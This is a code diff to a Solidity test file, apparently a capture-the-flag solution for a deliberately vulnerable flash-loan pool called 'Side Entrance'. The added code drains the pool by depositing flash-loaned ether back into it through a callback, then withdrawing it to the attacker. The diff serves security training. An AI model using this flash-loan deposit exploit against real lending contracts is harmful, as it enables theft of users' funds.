@@ -32,15 +32,23 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
+    }
+
     function testExploit() public {
         /** EXPLOIT START **/
-
-        /** EXPLOIT END **/
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        sideEntranceLenderPool.withdraw();
+        attacker.transfer(ETHER_IN_POOL);
         validation();
+        /** EXPLOIT END **/
     }
 
     function validation() internal {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
+
+    receive() external payable {}
 }
